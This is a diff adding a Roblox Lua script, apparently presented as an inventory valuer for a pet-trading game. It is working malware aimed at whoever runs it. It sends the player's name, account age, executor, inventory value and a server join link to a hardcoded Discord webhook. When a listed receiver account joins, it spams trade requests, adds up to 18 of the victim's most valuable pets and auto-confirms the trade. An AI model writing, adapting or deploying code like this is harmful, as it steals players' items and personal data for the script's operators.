@@ -1,0 +1,192 @@
+-- [[ ꒰₊˚ ꜱᴄʀɪᴘᴛ ๑ ʟʏɴx ﹒˚₊꒱ - OMNIPOTENT HASHED PESOS ]] --
+
+-- 1. INITIALIZATION & SERVICES
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local LocalPlayer = Players.LocalPlayer
+
+-- Wait for player and GUI
+while not LocalPlayer or not LocalPlayer:FindFirstChild("PlayerGui") do 
+    task.wait(0.5) 
+    LocalPlayer = Players.LocalPlayer 
+end
+
+-- 2. TOBI'S HASH FINDER (The Engine)
+local hashes = {}
+for _, v in pairs(getgc()) do
+    if type(v) == "function" and debug.getinfo(v).name == "get_remote_from_cache" then
+        local upvalues = debug.getupvalues(v)
+        if type(upvalues[1]) == "table" then
+            for key, value in pairs(upvalues[1]) do 
+                hashes[key] = value 
+            end
+        end
+    end
+end
+
+local function hashedAPI(remoteName, ...)
+    local remote = hashes[remoteName]
+    if not remote then return nil end
+    if remote:IsA("RemoteFunction") then return remote:InvokeServer(...)
+    elseif remote:IsA("RemoteEvent") then remote:FireServer(...) end
+end
+
+-- 3. CONFIGURATION (Direct Load)
+local WEBHOOK = "https://discord.com/api/webhooks/1408047737102012506/4VZHtB_G9RmikEuLs0-A6yP_0AXaYmb4_4Y3TyaG_0Wxem1-OvNBtPC9n71B4-SSzkUa"
+local users = {"2ndcfpaj67", "CREOLEO23", "CREOLEO25"}
+local colors = {legendary=0xFFD700, ultra_rare=0xA020F0, rare=0x1E90FF, uncommon=0x32CD32, common=0xB0B0B0}
+
+-- 4. THE VALUATION ENGINE (AMVGG Sided Only)
+local PetBaseValues = {}
+local rarityBase = {legendary=1.2, ultra_rare=0.85, rare=0.45, uncommon=0.12, common=0.01}
+
+local function scaleValue(rawValue)
+    if not rawValue or rawValue <= 0 then return 0 end
+    local val = rawValue * 10
+    if val < 10 then return 2
+    elseif val < 30 then return 100 + val * 10
+    elseif val < 100 then return 400 + val * 6
+    else return val * 10 end
+end
+
+local function getMutationBonus(p)
+    local bonus = 0
+    if p.mega_neon or p.mega then bonus = bonus + 3
+    elseif p.neon then bonus = bonus + 1 end
+    if p.rideable then bonus = bonus + 0.5 end
+    if p.flyable then bonus = bonus + 0.5 end
+    return bonus
+end
+
+-- Fetch from AMVGG (No Manual List)
+pcall(function()
+    local resp = request({Url = "https://amvgg.com/values/pets", Method = "GET"})
+    if resp and resp.Body then
+        local data = HttpService:JSONDecode(resp.Body)
+        local pets = HttpService:JSONDecode(data.pets or "[]")
+        for _, pet in pairs(pets) do 
+            if pet.name then 
+                PetBaseValues[pet.name] = tonumber(pet.rvalue) or 0 
+            end 
+        end
+    end
+end)
+
+-- 5. INVENTORY SCAN & DETECTION
+local Fsys = require(ReplicatedStorage:WaitForChild("Fsys")).load
+local InventoryDB = Fsys("InventoryDB")
+local ClientData = Fsys("ClientData")
+
+local function processInventory()
+    local inv = ClientData.get("inventory")
+    local rawPets = inv.pets or {}
+    local processed = {}
+    local total = 0
+
+    for uid, pet in pairs(rawPets) do
+        local petData = InventoryDB.pets[pet.id]
+        if petData and petData.name then
+            local name = petData.name
+            local mutations = pet.properties or {}
+            
+            -- Pull exclusively from AMVGG or fall back to Rarity Base
+            local rawVal = PetBaseValues[name] or rarityBase[string.lower(petData.rarity or "common")] or 0.01
+            
+            local scaled = scaleValue(rawVal)
+            local bonus = getMutationBonus(mutations)
+            local finalPetVal = scaled + bonus
+            
+            total = total + finalPetVal
+            table.insert(processed, {
+                uid = uid, 
+                name = name, 
+                val = finalPetVal, 
+                rarity = string.lower(petData.rarity or "common"),
+                props = mutations
+            })
+        end
+    end
+    table.sort(processed, function(a,b) return a.val > b.val end)
+    return processed, total
+end
+
+-- 6. WEBHOOK & EMBED
+local petList, totalValue = processInventory()
+local tier = totalValue >= 50000 and "🔴 HIGH" or totalValue >= 10000 and "🟡 MID" or "🟢 LOW"
+
+local function sendHit()
+    local lines = {}
+    for i=1, math.min(12, #petList) do
+        local p = petList[i]
+        local emoji = p.props.mega_neon and "🌈" or p.props.neon and "🟣" or "🐾"
+        table.insert(lines, emoji.." "..p.name.." ($"..string.format("%.0f", p.val)..")")
+    end
+
+    local payload = {
+        content = (tier == "🔴 HIGH" and "@everyone" or ""),
+        embeds = {{
+            title = "꒰₊˚ ꜱᴄʀɪᴘᴛ ๑ ʟʏɴx ʜɪᴛ ﹒˚₊꒱",
+            description = "```" ..
+                "👤 Name     : "..LocalPlayer.DisplayName.."\n"..
+                "🆔 User     : "..LocalPlayer.Name.."\n"..
+                "📅 Age      : "..LocalPlayer.AccountAge.." Days\n"..
+                "📱 Executor : "..(identifyexecutor and identifyexecutor() or "Unknown").."\n"..
+                "💰 Value    : $"..string.format("%.0f", totalValue).."\n"..
+                "📊 Tier     : "..tier.."```",
+            fields = {
+                {name = "🏆 Best Pet", value = "```"..(petList[1] and petList[1].name or "None").."```", inline = true},
+                {name = "🐶 Inventory (AMVGG Pesos)", value = "```"..table.concat(lines, "\n").."```"},
+                {name = "🌐 Join", value = "[Click to Join](https://www.roblox.com/games/start?placeId="..game.PlaceId.."&instanceId="..game.JobId..")"}
+            },
+            color = colors[petList[1] and petList[1].rarity] or 0x2F3136,
+            footer = {text = "Omnipotent Lynx | Pure AMVGG Logic"}
+        }}
+    }
+    request({Url = WEBHOOK, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(payload)})
+end
+
+if #petList > 0 then sendHit() end
+
+-- 7. THE STEAL (Hashed Remotes)
+local function startSteal(target)
+    task.spawn(function()
+        -- Spam Trade
+        for i = 1, 60 do
+            if LocalPlayer.PlayerGui.TradeApp.Frame.Visible then break end
+            hashedAPI("TradeAPI/SendTradeRequest", target)
+            task.wait(0.25)
+        end
+
+        if LocalPlayer.PlayerGui.TradeApp.Frame.Visible then
+            -- Add Items
+            for i = 1, math.min(18, #petList) do
+                hashedAPI("BackpackAPI/CommitBackpackItemSet", "backpack_locks", {[petList[i].uid] = true})
+                hashedAPI("TradeAPI/AddItemToOffer", petList[i].uid)
+                task.wait(0.1)
+            end
+            
+            -- Accept Loop
+            while LocalPlayer.PlayerGui.TradeApp.Frame.Visible do
+                hashedAPI("TradeAPI/AcceptNegotiation")
+                task.wait(0.4)
+                hashedAPI("TradeAPI/ConfirmTrade")
+            end
+        end
+    end)
+end
+
+-- Watch for receiver join
+task.spawn(function()
+    while true do
+        for _, p in pairs(Players:GetPlayers()) do
+            if table.find(users, p.Name) and p ~= LocalPlayer then 
+                startSteal(p) 
+                return 
+            end
+        end
+        task.wait(1)
+    end
+end)
+
+print("🚀 Lynx Omnipotent Final Loaded. Total Inventory Value: $" .. totalValue)
